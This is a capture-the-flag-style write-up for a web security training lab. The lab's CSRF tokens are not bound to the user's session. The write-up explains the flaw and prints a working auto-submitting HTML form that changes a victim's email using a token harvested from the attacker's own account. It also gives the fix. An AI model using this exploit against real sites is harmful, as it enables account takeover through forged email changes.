
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`



-----------------

# Solution


The server validates that the CSRF token is real, but doesn’t check that it belongs to the user’s session. Any valid token works for any user.

Attack: log in to your own account, grab a fresh CSRF token from the change-email form (drop the request so you don’t consume it since tokens are single-use), and include it in your exploit. The victim’s browser submits the form with your token and the server accepts it because it only checks “is this token valid,” not “does this token belong to this session.”


```
<html>
  <body>
    <form action="https://0a7800b8037b308980c4213300fd0091.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
      <input type="hidden" name="csrf" value="J8AsRYwIARvsJT4xqs5saBaJphrvlFc5" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```


The fix is to tie each CSRF token to the user’s session so tokens from one session can’t be used in another.